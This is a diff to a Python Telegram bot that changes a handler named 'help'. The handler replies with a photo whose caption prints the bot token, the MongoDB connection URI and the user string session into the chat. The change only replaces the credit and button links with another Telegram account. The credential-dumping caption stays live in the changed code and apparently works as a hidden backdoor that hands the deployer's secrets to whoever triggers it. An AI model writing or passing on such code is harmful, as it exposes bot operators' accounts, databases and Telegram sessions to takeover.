@@ -113,12 +113,12 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""ʙσᴛ ᴛσᴋєη :-   `{BOT_TOKEN}` \n\nϻσηɢᴏ :-   `{MONGO_DB_URI}`\n\nѕтʀɪηɢ sєssɪση :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/LEGEND_MICKEY)............☆""",
+       caption=f"""ʙσᴛ ᴛσᴋєη :-   `{BOT_TOKEN}` \n\nϻσηɢᴏ :-   `{MONGO_DB_URI}`\n\nѕтʀɪηɢ sєssɪση :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Mrmental001)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• ᴀʟᴘʜᴀ ʙᴀʙʏ  •", url=f"https://t.me/ll_ALPHA_BABY_lll")
+                         "•  𝞄⃕𝖋𝖋 𝑚𝑟 𝑚𝑒𝑛𝑡𝑎𝑙  •", url=f"https://t.me/Mrmental001")
                  ]
             ]
          ),
